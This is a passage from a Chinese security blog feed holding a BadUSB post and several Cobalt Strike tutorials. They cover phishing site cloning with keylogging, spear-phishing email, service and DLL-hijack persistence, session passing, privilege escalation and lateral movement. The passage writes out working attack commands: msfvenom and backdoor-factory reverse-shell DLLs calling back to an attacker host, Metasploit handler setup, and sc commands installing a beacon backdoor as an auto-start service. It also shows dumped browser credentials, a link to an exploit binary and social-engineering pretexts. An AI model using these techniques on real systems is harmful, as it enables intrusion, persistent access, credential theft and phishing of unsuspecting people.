alt="eACnJg.png"></a><br>过了几分钟，会来两封邮件<br><a href="https://imgchr.com/i/eACmFS"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454768.png" alt="eACmFS.png"></a><br><a href="https://imgchr.com/i/eAiHzQ"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454150.png" alt="eAiHzQ.png"></a><br>这里面便是我们心心念念的Badusb执行结果<br>Report.zip内容如图<br><a href="https://imgchr.com/i/eAiLss"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454104.png" alt="eAiLss.png"></a></p><p>Getpass txt内容如下</p><pre><code>|==========================                                                                       |                                                                |                        The LaZagne Project                       |                                                                   |                                                                   |==========================########## User: Administrator ##########------------------- Chrome passwords -----------------Password found !!!URL: http://127.0.0.1/loginLogin: adminPassword: xunfeng321Password found !!!URL: http://10.97.3.177:8080/cgi-bin/login.htmlLogin: adminPassword: admin..........内容太多，省略了</code></pre><p>Cobaltstrike也收到了会话（我插了好几次）<br><a href="https://imgchr.com/i/eAClyn"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454731.png" alt="eAClyn.png"></a></p><h2 id="0x005攻击场景"><a href="#0x005攻击场景" class="headerlink" title="0x005攻击场景"></a>0x005攻击场景</h2><p>①社工攻击<br>  小姐姐，我的U盘插我的电脑显示不出来，你能帮我看看你的电脑可以吗？<br>  <a href="https://imgchr.com/i/eACGwV"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455578.png" alt="eACGwV.png"></a><br>②带有USB接口的终端机<br><a href="https://imgchr.com/i/eACJoT"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455649.png" alt="eACJoT.png"></a><br>找到USB接口怼进去，插谁谁怀孕<br>其他应用场景自行脑补，欢迎评论分享</p><h2 id="0x06总结"><a href="#0x06总结" class="headerlink" title="0x06总结"></a>0x06总结</h2><p>   今天介绍了硬件设备Badusb的制作及使用，大家可以修改服务器端的powershell代码来实现更多的功能，欢迎评论分享自己的思路<br>本篇文章耗时7小时，也算是自己写过比较长的啦。<br><a href="https://imgchr.com/i/eAC1Lq"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455674.png" alt="eAC1Lq.png"></a></p><h2 id="0x006-Badusb代码下载"><a href="#0x006-Badusb代码下载" class="headerlink" title="0x006 Badusb代码下载"></a>0x006 Badusb代码下载</h2><p>链接：<a href="https://pan.baidu.com/s/1ODHBZXUlyRxwk75Q6yuIXg">https://pan.baidu.com/s/1ODHBZXUlyRxwk75Q6yuIXg</a><br>提取码：zisl</p>]]></content>
      
      
      <categories>
          
          <category> 硬件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十四)网站克隆与邮件鱼叉钓鱼</title>
      <link href="/2019/06/21/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E5%9B%9B-%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E4%B8%8E%E9%82%AE%E4%BB%B6%E9%B1%BC%E5%8F%89%E9%92%93%E9%B1%BC/"/>
      <url>/2019/06/21/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E5%9B%9B-%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E4%B8%8E%E9%82%AE%E4%BB%B6%E9%B1%BC%E5%8F%89%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>亲们，这篇是cobaltstrike系列教程的最后一篇啦~写这套教程，我足足写了一个周，还是非常疲惫的，但是想到大家可以从中收获一些东西，便又充满了力量。</p><p>这个浮躁的时代，很少有人会静下心来学习与分享，我也是浮躁的一员，但也想为这个圈子留下点东西，因此决定平时多写一些文章供大家阅读。</p><h2 id="0x02-网站克隆"><a href="#0x02-网站克隆" class="headerlink" title="0x02-网站克隆"></a>0x02-网站克隆</h2><p>菜单栏，攻击–&gt;钓鱼攻击–&gt;克隆网站<br><a href="https://imgchr.com/i/e8rLxP"><img src="https://s2.ax1x.com/2019/07/29/e8rLxP.png" alt="e8rLxP.png"></a><br>根据你的个人需求，填写克隆网址，主机地址，和你的端口，注意端口不要冲突<br>记得把键盘记录打开<br><a href="https://imgchr.com/i/e8roUH"><img src="https://s2.ax1x.com/2019/07/29/e8roUH.png" alt="e8roUH.png"></a><br>如图，我们成功克隆出一个百度<br><a href="https://imgchr.com/i/e8rHPA"><img src="https://s2.ax1x.com/2019/07/29/e8rHPA.png" alt="e8rHPA.png"></a></p><p>随后我们在，视图–&gt;web日志中查看相关信息<br><a href="https://imgchr.com/i/e8rIVe"><img src="https://s2.ax1x.com/2019/07/29/e8rIVe.png" alt="e8rIVe.png"></a><br>如图，一位不知名的用户在该页面输入了J0o1ey dashuaibi<br><a href="https://imgchr.com/i/e8rb8I"><img src="https://s2.ax1x.com/2019/07/29/e8rb8I.png" alt="e8rb8I.png"></a></p><h2 id="0x03-邮件鱼叉钓鱼"><a href="#0x03-邮件鱼叉钓鱼" class="headerlink" title="0x03-邮件鱼叉钓鱼"></a>0x03-邮件鱼叉钓鱼</h2><p>使用 攻击–&gt;邮件钓鱼</p><pre><code>targets 发送的目标信息 格式 xxxx@xxx.com(tab键) name55x@qq.com        TOMxx@163.com        jimtmplate 邮件模板 一般在邮件的更多选项中 ，选择导出，或者显示原文attachment 附件Embed URL 要嵌入的网址Mail server SMTPBounce to 模仿发件人preview 预览我们的模板文件 </code></pre><p><a href="https://imgchr.com/i/e8rq2t"><img src="https://s2.ax1x.com/2019/07/29/e8rq2t.png" alt="e8rq2t.png"></a><br>send发送成功后我们可以在 send email 看到提示</p><p>这个功能不推荐大家使用，发出去的邮件泼出去的水，很容易被取证的，自己娱乐玩下就好</p><p><a href="https://imgchr.com/i/e8rjr8"><img src="https://s2.ax1x.com/2019/07/29/e8rjr8.png" alt="e8rjr8.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十三)控制持久化</title>
      <link href="/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%89-%E6%8E%A7%E5%88%B6%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%89-%E6%8E%A7%E5%88%B6%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-右键菜单实现控制持久化"><a href="#0x01-右键菜单实现控制持久化" class="headerlink" title="0x01-右键菜单实现控制持久化"></a>0x01-右键菜单实现控制持久化</h2><p>在windows中，拿到目标主机权限后，，维持权限是必不可少的工作。<br>目前常见的手法有:</p><pre><code>1.注册表2.启动项3.计时任务4.设置服务5.shift后门6.dll劫持(白加黑)7.利用其他安装的软件</code></pre><p>在我之前给出的插件中，已经包含了控制持久化的插件<br>如图，里面包含了很多控制持久化的方法，可自动执行<br><a href="https://imgchr.com/i/e8U66e"><img src="https://s2.ax1x.com/2019/07/29/e8U66e.png" alt="e8U66e.png"></a></p><p>前几个Persist(※)貌似都是劫持关键程序的dll实现控制持久化</p><p>Sticky Keys是大家熟悉的粘滞键后门(shift后门，摁五下shift弹出cmd窗口)</p><p>Scheduled Job方法为写计划任务维持权限</p><p>利用这个菜单实现控制持久化虽然方便，但是存在一定的局限，也有很多问题，下面简单讲两种个人常用的维持权限的方法</p><h2 id="0x02-Windows-Service维持权限"><a href="#0x02-Windows-Service维持权限" class="headerlink" title="0x02-Windows Service维持权限"></a>0x02-Windows Service维持权限</h2><p>在cobaltstrike中生成一个Windows service服务后门<br><a href="https://imgchr.com/i/e8UWTI"><img src="https://s2.ax1x.com/2019/07/29/e8UWTI.png" alt="e8UWTI.png"></a></p><p>导出时后门名为beacon.exe<br><a href="https://imgchr.com/i/e8UylD"><img src="https://s2.ax1x.com/2019/07/29/e8UylD.png" alt="e8UylD.png"></a><br>随后在beacon中执行如下命令</p><pre><code>beacon&gt; cd C:\WINDOWS\Temp\[] cd C:\WINDOWS\Temp\[+] host called home, sent: 24 bytes beacon&gt; upload /root/beacon.exe[] Tasked beacon to upload /root/beacon.exe as beacon.exe[+] host called home, sent: 309782 bytesbeacon&gt; shell sc create &quot;thisisserver&quot; binpath= &quot;C:\WINDOWS\Temp\beacon.exe&quot;[] Tasked beacon to run: sc create &quot;thisisserver&quot; binpath= &quot;C:\WINDOWS\Temp\beacon.exe&quot;[+] host called home, sent: 93 bytes[+] received output:[SC] CreateService 成功beacon&gt; shell sc description &quot;thisisserver&quot; &quot;description&quot;[] Tasked beacon to run: sc description &quot;thisisserver&quot; &quot;description&quot;[+] host called home, sent: 74 bytes[+] received output:[SC] ChangeServiceConfig2 成功beacon&gt; shell sc config &quot;thisisserver&quot; start= auto[] Tasked beacon to run: sc config &quot;thisisserver&quot; start= auto[+] host called home, sent: 67 bytes[+] received output:[SC] ChangeServiceConfig 成功beacon&gt; shell net start &quot;thisisserver&quot;[] Tasked beacon to run: net start &quot;thisisserver&quot;[+] host called home, sent: 55 bytes*</code></pre><p>这样的话目标机每次开机，都会运行你的beacon.exe后门，实现控制的持久化。<br>当然，如果目标主机存在杀毒全家桶的话，那么对你后门的免杀是有很高要求的，至于cobaltstrike后门的免杀，打算过一段时间做个番外篇讲，老铁们可以关注下~</p><h2 id="0x03-dll劫持-白加黑-维持权限"><a href="#0x03-dll劫持-白加黑-维持权限" class="headerlink" title="0x03-dll劫持(白加黑)维持权限"></a>0x03-dll劫持(白加黑)维持权限</h2><p>Dll劫持的话，主要是劫持那些经常运行程序的dll，这样程序一运行，就会加载我们的恶意dll。实现控制持久化</p><h3 id="我们来看一个例子，劫持微信的dll"><a href="#我们来看一个例子，劫持微信的dll" class="headerlink" title="我们来看一个例子，劫持微信的dll"></a>我们来看一个例子，劫持微信的dll</h3><p>首先使用Process Explore查看微信调用的文件<br><a href="https://imgchr.com/i/e8U0Fx"><img src="https://s2.ax1x.com/2019/07/29/e8U0Fx.png" alt="e8U0Fx.png"></a></p><p>本次测试，是劫持的他的d3dcompiler_47.dll<br>使用backdoor factory制作dll后门(保存在目录的backdoored文件夹下)<br>链接:<a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a><br>命令如下</p><pre><code>python backdoor.py -f d3dcompiler_47.dll -s reverse_shell_tcp_inline -P 6666 -H 8.8.8.8(你的teamserver)</code></pre><p><a href="https://imgchr.com/i/e8UtOJ"><img src="https://s2.ax1x.com/2019/07/29/e8UtOJ.png" alt="e8UtOJ.png"></a><br>把这个加了后门的dll放到微信程序的文件夹下<br>用cobaltstrike配置一个tcp协议监听6666端口的Listener，或者nc监听6666端口，目标机运行微信时，即可收到反弹的shell</p><h3 id="再看一个，劫持notepad的dll："><a href="#再看一个，劫持notepad的dll：" class="headerlink" title="再看一个，劫持notepad的dll："></a>再看一个，劫持notepad的dll：</h3><p>我们首先打开Kali，用Metasploit或者cobaltstrike来生成一个dll木马<br>Metasploit生成dll后门命令</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.199.107 lport=6666 -f dll &gt; ./Msimg32.dll</code></pre><p>Cobaltstrike生成dll后门方法<br><a href="https://imgchr.com/i/e8UR0A"><img src="https://s2.ax1x.com/2019/07/29/e8UR0A.png" alt="e8UR0A.png"></a></p><p>然后配置6666端口的监听<br>Metasploit:</p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.199.107set lport 6666exploit</code></pre><p>Cobaltstrike:<br>请看教程第二节</p><p>然后我们把dll放到notepad文件夹中，运行notpad++，即可返回会话。</p><p><a href="https://imgchr.com/i/e8UsSO"><img src="https://s2.ax1x.com/2019/07/29/e8UsSO.png" alt="e8UsSO.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十二)CS与MSF,Armitage,Empire会话互转</title>
      <link href="/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%BA%8C-CS%E4%B8%8EMSF-Armitage-Empire%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC/"/>
      <url>/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%BA%8C-CS%E4%B8%8EMSF-Armitage-Empire%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrike与MSF会话互转"><a href="#0x01-Cobaltstrike与MSF会话互转" class="headerlink" title="0x01-Cobaltstrike与MSF会话互转"></a>0x01-Cobaltstrike与MSF会话互转</h2><h3 id="①Metasploit派生shell给Cobaltstrike"><a href="#①Metasploit派生shell给Cobaltstrike" class="headerlink" title="①Metasploit派生shell给Cobaltstrike"></a>①Metasploit派生shell给Cobaltstrike</h3><p>首先，你需要拿到一个metepreter会话，本例中session为1<br>Cobaltstrike的teamserver的ip为8.8.8.8，http监听器端口为4555</p><pre><code>msf exploit(handler) &gt;  use exploit/windows/local/payload_injectmsf exploit(payload_inject) &gt;  set PAYLOAD windows/meterpreter/reverse_httpmsf exploit(payload_inject) &gt; set DisablePayloadHandler truemsf exploit(payload_inject) &gt; set LHOST 8.8.8.8.msf exploit(payload_inject) &gt; set LPORT 4555msf exploit(payload_inject) &gt; set SESSION 1msf exploit(payload_inject) &gt; exploit</code></pre><p>如图Cobaltstrike成功上线<br><a href="https://imgchr.com/i/e8Qn4H"><img src="https://s2.ax1x.com/2019/07/29/e8Qn4H.png" alt="e8Qn4H.png"></a></p><h3 id="②Cobalt-strike-派生-shell-给-MSF-前提有个beacon-shell"><a href="#②Cobalt-strike-派生-shell-给-MSF-前提有个beacon-shell" class="headerlink" title="②Cobalt strike 派生 shell 给 MSF(前提有个beacon shell)"></a>②Cobalt strike 派生 shell 给 MSF(前提有个beacon shell)</h3><pre><code>msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 8.8.8.8lhost =&gt; 8.8.8.8msf exploit(handler) &gt; set lport 5555lport =&gt; 5555msf exploit(handler) &gt; exploit</code></pre><p>然后在cobaltstrike中创建一个windows&#x2F;foreign&#x2F;reverse_tcp Listener<br>，并根据metasploit监听配置cobaltstrike的listener<br><a href="https://imgchr.com/i/e8QVHO"><img src="https://s2.ax1x.com/2019/07/29/e8QVHO.png" alt="e8QVHO.png"></a></p><p>选择要派生的beacon，右键–&gt;增加会话，选择刚刚配置的foreign监听器<br><a href="https://imgchr.com/i/e8QEDK"><img src="https://s2.ax1x.com/2019/07/29/e8QEDK.png" alt="e8QEDK.png"></a></p><p>MSF即可成功收到会话<br><a href="https://imgchr.com/i/e8QAu6"><img src="https://s2.ax1x.com/2019/07/29/e8QAu6.png" alt="e8QAu6.png"></a></p><h2 id="0x02-Cobaltstrike与Armitage会话互转"><a href="#0x02-Cobaltstrike与Armitage会话互转" class="headerlink" title="0x02-Cobaltstrike与Armitage会话互转"></a>0x02-Cobaltstrike与Armitage会话互转</h2><h3 id="①Cobaltstrike派生shell给Armitage"><a href="#①Cobaltstrike派生shell给Armitage" class="headerlink" title="①Cobaltstrike派生shell给Armitage"></a>①Cobaltstrike派生shell给Armitage</h3><p>首先在armitage中配置一个handler，注意：payload要与cobaltstrike的foreign监听器的协议相同，不然收不到会话。<br><a href="https://imgchr.com/i/e8Qlvt"><img src="https://s2.ax1x.com/2019/07/29/e8Qlvt.png" alt="e8Qlvt.png"></a><br>同样使用刚刚讲过的cobaltstrike派生会话功能，armitage即可收到shell<br><a href="https://imgchr.com/i/e8Q3KP"><img src="https://s2.ax1x.com/2019/07/29/e8Q3KP.png" alt="e8Q3KP.png"></a></p><h3 id="Armitage派生shell给cobaltstrike"><a href="#Armitage派生shell给cobaltstrike" class="headerlink" title="Armitage派生shell给cobaltstrike"></a>Armitage派生shell给cobaltstrike</h3><p>选择armitage中的会话，右键，Access–&gt;Pss Session<br><a href="https://imgchr.com/i/e8QeED"><img src="https://s2.ax1x.com/2019/07/29/e8QeED.png" alt="e8QeED.png"></a><br>随后配置相关信息为cobaltstrike http监听器的ip和端口<br><a href="https://imgchr.com/i/e8QmUe"><img src="https://s2.ax1x.com/2019/07/29/e8QmUe.png" alt="e8QmUe.png"></a><br>Cobaltstrike即可收到会话</p><h2 id="0x003-Cobaltstrike与Empire会话互转"><a href="#0x003-Cobaltstrike与Empire会话互转" class="headerlink" title="0x003-Cobaltstrike与Empire会话互转"></a>0x003-Cobaltstrike与Empire会话互转</h2><p>首先如图，在empire中配置好相关的http协议监听器<br><a href="https://imgchr.com/i/e8QKCd"><img src="https://s2.ax1x.com/2019/07/29/e8QKCd.png" alt="e8QKCd.png"></a><br>在cobaltstrike里面添加一个foreign监听器，协议为http<br><a href="https://imgchr.com/i/e8QM8A"><img src="https://s2.ax1x.com/2019/07/29/e8QM8A.png" alt="e8QM8A.png"></a><br>随后使用cobaltstrike中讲过的“增加会话”功能，选择该http监听器，empire即可成功收到会话。</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十一)提权与横向移动</title>
      <link href="/2019/06/17/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%80-%E6%8F%90%E6%9D%83%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2019/06/17/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%80-%E6%8F%90%E6%9D%83%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x001-提权"><a href="#0x001-提权" class="headerlink" title="0x001-提权"></a>0x001-提权</h2><h3 id="1-右键菜单提权"><a href="#1-右键菜单提权" class="headerlink" title="1.右键菜单提权:"></a>1.右键菜单提权:</h3><p>选择beacon，右键，执行–&gt;提权<br><img src="https://s2.ax1x.com/2019/07/29/e1wAFP.png" alt="e1wAFP.png"><br>我由于加载了插件，所以比官方多了几种提权方式<br>插件下载请看我之前的帖子<br><a href="https://imgchr.com/i/e1dbZR"><img src="https://s2.ax1x.com/2019/07/29/e1dbZR.png" alt="e1dbZR.png"></a></p><h3 id="ms14-058-x2F-ms15-051-x2F-ms16-016-x2F-ms16-032"><a href="#ms14-058-x2F-ms15-051-x2F-ms16-016-x2F-ms16-032" class="headerlink" title="ms14-058&#x2F;ms15-051&#x2F;ms16-016&#x2F;ms16-032"></a>ms14-058&#x2F;ms15-051&#x2F;ms16-016&#x2F;ms16-032</h3><p>这些都是大家耳熟能详的Windows本地提权漏洞，在此插件中都已经集成</p><h3 id="UAC-DLL"><a href="#UAC-DLL" class="headerlink" title="UAC-DLL"></a>UAC-DLL</h3><p>这是一种绕过UAC的攻击，它试图将本地管理员运行的有效负载从低权限提升到高权限。此攻击使用UAC漏洞将ArtifactKit生成的DLL复制到特权位置。此攻击适用于Windows7和Windows8及更高版本的未修补版本。</p><h3 id="uac-token-duplication"><a href="#uac-token-duplication" class="headerlink" title="uac-token-duplication"></a>uac-token-duplication</h3><p>这是另一种绕过UAC的攻击，将其从低权限提升到高权限（作为本地管理员）。这种攻击使用一个UAC漏洞，允许非提升进程使用从提升进程中窃取的令牌启动任意进程。此漏洞要求攻击删除分配给提升令牌的多个权限。此攻击适用于Windows7及更高版本。如果AlwaysNotify处于其最高设置，则此攻击要求提升的进程已在当前桌面会话中运行（作为同一用户）,此漏洞使用PowerShell生成会话。</p><h3 id="Uac-eventvwr"><a href="#Uac-eventvwr" class="headerlink" title="Uac-eventvwr"></a>Uac-eventvwr</h3><p>这种提权方法是利用时间查看器eventvwr，通过注册表之后，执行Eventvwr.exe会自动加载我们的A.exe(exp),这个时候他的权限就是高了，成功绕过UAV<br><a href="https://imgchr.com/i/e1dLIx"><img src="https://s2.ax1x.com/2019/07/29/e1dLIx.png" alt="e1dLIx.png"></a></p><h3 id="Uac-wscript"><a href="#Uac-wscript" class="headerlink" title="Uac-wscript"></a>Uac-wscript</h3><p>这种绕过uac提权的方法最初是在Empire框架中现身的，该方法只针对Windows7有效</p><h3 id="2-自用EXP提权"><a href="#2-自用EXP提权" class="headerlink" title="2.自用EXP提权"></a>2.自用EXP提权</h3><p>这种方式就是比较常规的方法，自己上传最新的EXP进行提权，至于文件上传和执行的方法，之前已经讲过，在此不多赘述<br>最近测试CVE-2019-0803的提权效果不错，影响版本非常广</p><pre><code>Microsoft Windows Server 2019 0Microsoft Windows Server 2016 0Microsoft Windows Server 2012 R2 0Microsoft Windows Server 2012 0Microsoft Windows Server 2008 R2 for x64-based Systems SP1Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1Microsoft Windows Server 2008 for x64-based Systems SP2Microsoft Windows Server 2008 for Itanium-based Systems SP2Microsoft Windows Server 2008 for 32-bit Systems SP2Microsoft Windows Server 1803 0Microsoft Windows Server 1709 0Microsoft Windows RT 8.1Microsoft Windows 8.1 for x64-based Systems 0Microsoft Windows 8.1 for 32-bit Systems 0Microsoft Windows 7 for x64-based Systems SP1Microsoft Windows 7 for 32-bit Systems SP1Microsoft Windows 10 Version 1809 for x64-based Systems 0Microsoft Windows 10 Version 1809 for ARM64-based Systems 0Microsoft Windows 10 Version 1809 for 32-bit Systems 0Microsoft Windows 10 Version 1803 for x64-based Systems 0Microsoft Windows 10 Version 1803 for ARM64-based Systems 0Microsoft Windows 10 Version 1803 for 32-bit Systems 0Microsoft Windows 10 version 1709 for x64-based Systems 0Microsoft Windows 10 Version 1709 for ARM64-based Systems 0Microsoft Windows 10 version 1709 for 32-bit Systems 0Microsoft Windows 10 version 1703 for x64-based Systems 0Microsoft Windows 10 version 1703 for 32-bit Systems 0Microsoft Windows 10 Version 1607 for x64-based Systems 0Microsoft Windows 10 Version 1607 for 32-bit Systems 0Microsoft Windows 10 for x64-based Systems 0Microsoft Windows 10 for 32-bit Systems 0</code></pre><p>EXP的下载链接为:<a href="https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe">https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe</a><br>用法:CVE-2019-0803.exe cmd cmdline，可能需要多执行几次才可以成功<br><a href="https://imgchr.com/i/e1dqd1"><img src="https://s2.ax1x.com/2019/07/29/e1dqd1.png" alt="e1dqd1.png"></a></p><h3 id="3-Powershell提权"><a href="#3-Powershell提权" class="headerlink" title="3.Powershell提权"></a>3.Powershell提权</h3><p>在此需要使用beacon中的命令-powershell-import</p><pre><code>beacon&gt; help powershell-importUse: powershell-import [/path/to/local/script.ps1]Import a powershell script which is combined with futurecalls to the powershell command. You may only use oneimported script at a time.</code></pre><p><a href="https://imgchr.com/i/e1djJK"><img src="https://s2.ax1x.com/2019/07/29/e1djJK.png" alt="e1djJK.png"></a><br>使用 powershell-import 本地导入我们的脚本，powershell执行,PowerUp.ps1 这个模块是个提权辅助模块<br>下载链接:<a href="https://github.com/HarmJ0y/PowerUp">https://github.com/HarmJ0y/PowerUp</a></p><h2 id="0x002-横向移动"><a href="#0x002-横向移动" class="headerlink" title="0x002-横向移动"></a>0x002-横向移动</h2><h3 id="横向渗透概念"><a href="#横向渗透概念" class="headerlink" title="横向渗透概念:"></a>横向渗透概念:</h3><p>横向渗透攻击技术是复杂网络攻击中广泛使用的一种技术，特别是在高级持续威胁（Advanced Persistent Threats，APT）中更加热衷于使用这种攻击方法。攻击者可以利用这些技术，以被攻陷的系统为跳板，访问其他主机，获取包括邮箱、共享文件夹或者凭证信息在内的敏感资源。攻击者可以利用这些敏感信息，进一步控制其他系统、提升权限或窃取更多有价值的凭证。借助此类攻击，攻击者最终可能获取域控的访问权限，完全控制基于Windows系统的基础设施或与业务相关的关键账户。<br>在提权后，我们可以用mimikatz dump目标机的凭证，并进行内网横向移动</p><h3 id="1-Psexec横向移动"><a href="#1-Psexec横向移动" class="headerlink" title="1.Psexec横向移动"></a>1.Psexec横向移动</h3><p>在执行端口扫描后<br>目标视图中，选择一个目标，右键–&gt;登录–p**ec，即可选择凭证进行横向移动<br><a href="https://imgchr.com/i/e1dXi6"><img src="https://s2.ax1x.com/2019/07/29/e1dXi6.png" alt="e1dXi6.png"></a><br><a href="https://imgchr.com/i/e1dvRO"><img src="https://s2.ax1x.com/2019/07/29/e1dvRO.png" alt="e1dvRO.png"></a></p><p>如果该机使用了和之前的目标机一样的凭证，则会成功返回一个system beacon<br><a href="https://imgchr.com/i/e1wpsH"><img src="https://s2.ax1x.com/2019/07/29/e1wpsH.png" alt="e1wpsH.png"></a></p><h3 id="2-窃取令牌"><a href="#2-窃取令牌" class="headerlink" title="2.窃取令牌"></a>2.窃取令牌</h3><p>在进程列表中，寻找以域管理员身份运行的进程，并选定进行steal token，如果成功，则会返回域管权限的beacon，但是一般情况下绝不会那么简单的…在此就不演示了。<br><a href="https://imgchr.com/i/e1dxzD"><img src="https://s2.ax1x.com/2019/07/29/e1dxzD.png" alt="e1dxzD.png"></a></p><h3 id="3-其他手段横向移动"><a href="#3-其他手段横向移动" class="headerlink" title="3.其他手段横向移动"></a>3.其他手段横向移动</h3><p>①使用各种系统漏洞:比如说用ms17-010，ms08-067批量检测一下内网~<br>我之前的帖子发过cobaltstrike中ms17-10的利用脚本，貌似是从Empire框架上拔下来的。如图，该脚本集成了扫描与漏洞利用，可谓是非常方便<br><a href="https://imgchr.com/i/e1w9Ld"><img src="https://s2.ax1x.com/2019/07/29/e1w9Ld.png" alt="e1w9Ld.png"></a><br>PS:等到cve2019-0708一出，又是一场腥风血雨</p><p>②弱口令检测<br>内网中ssh弱口令，各种数据库的弱口令可谓是层出不穷。Mysql可以mof提权，sqlserver可以xp_cmdshell,redis写shell，oracle也有方法执行系统命令。</p><p>③中间件漏洞<br>这个就非常常见了，比如weblogic各种rce漏洞，tomcat弱口令等等</p><p>④Web端漏洞<br>挖掘web端漏洞，大家都懂</p><p>⑤域内漏洞<br>委派、域内权限策略配置问题等</p><p>⑤密码爆破、喷洒等</p><p>大家自行总结~</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(十)安装扩展</title>
      <link href="/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81-%E5%AE%89%E8%A3%85%E6%89%A9%E5%B1%95/"/>
      <url>/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81-%E5%AE%89%E8%A3%85%E6%89%A9%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x001-扩展的加载"><a href="#0x001-扩展的加载" class="headerlink" title="0x001-扩展的加载"></a>0x001-扩展的加载</h2><p>扩展是Cobaltstrike一个极为重要的模块，它有效地丰盈了cobaltstrike的功能<br>选择菜单栏的CobaltStrike–&gt;脚本管理器，点击load，然后选择cna扩展文件即可，旁边的unload为去除该扩展，，reload为重新加载该扩展<br><a href="https://imgchr.com/i/e18Nsx"><img src="https://s2.ax1x.com/2019/07/28/e18Nsx.png" alt="e18Nsx.png"></a></p><h2 id="0x002-个人常用扩展"><a href="#0x002-个人常用扩展" class="headerlink" title="0x002-个人常用扩展"></a>0x002-个人常用扩展</h2><p>本人在此放出几个自己常用的扩展，老哥们可以回复下载<br><a href="https://imgchr.com/i/e1Gete"><img src="https://s2.ax1x.com/2019/07/28/e1Gete.png" alt="e1Gete.png"></a></p><h2 id="0x003-其他扩展汇总-来自WBG老哥"><a href="#0x003-其他扩展汇总-来自WBG老哥" class="headerlink" title="0x003-其他扩展汇总(来自WBG老哥)"></a>0x003-其他扩展汇总(来自WBG老哥)</h2><h3 id="脚本名称：elevate-cna"><a href="#脚本名称：elevate-cna" class="headerlink" title="脚本名称：elevate.cna"></a>脚本名称：elevate.cna</h3><p>脚本功能：增加五种提权方式<br><a href="https://imgchr.com/i/e18JzR"><img src="https://s2.ax1x.com/2019/07/28/e18JzR.png" alt="e18JzR.png"></a></p><h3 id="脚本名称：ProcessTree-cna"><a href="#脚本名称：ProcessTree-cna" class="headerlink" title="脚本名称：ProcessTree.cna"></a>脚本名称：ProcessTree.cna</h3><p>脚本功能：让ps命令可以显示父子关系并显示颜色<br><a href="https://imgchr.com/i/e18wdO"><img src="https://s2.ax1x.com/2019/07/28/e18wdO.png" alt="e18wdO.png"></a></p><h3 id="脚本名称：CVE-2018-4878-cna"><a href="#脚本名称：CVE-2018-4878-cna" class="headerlink" title="脚本名称：CVE-2018-4878.cna"></a>脚本名称：CVE-2018-4878.cna</h3><p>脚本功能：CVE-2018-4878.cna</p><p><a 